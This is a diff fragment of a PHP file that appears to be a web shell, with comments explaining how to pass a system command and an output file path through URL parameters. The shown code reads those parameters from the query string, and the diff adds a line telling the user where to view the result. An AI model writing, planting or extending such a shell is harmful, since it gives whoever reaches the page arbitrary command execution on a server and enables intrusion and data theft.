@@ -2,6 +2,7 @@
 // Con7ext
 // USAGE = file.php?c=COMMAND&p=/PATH/FILE < FILE TO CREATE
 // EX : file.php?c=/bin/ls&p=/home/rintod/result.txt
+// TO SEE RESULT ACCESS: /result.txt
 $comd = @$_GET[c];
 $fl = @$_GET[p];
 @ob_start();
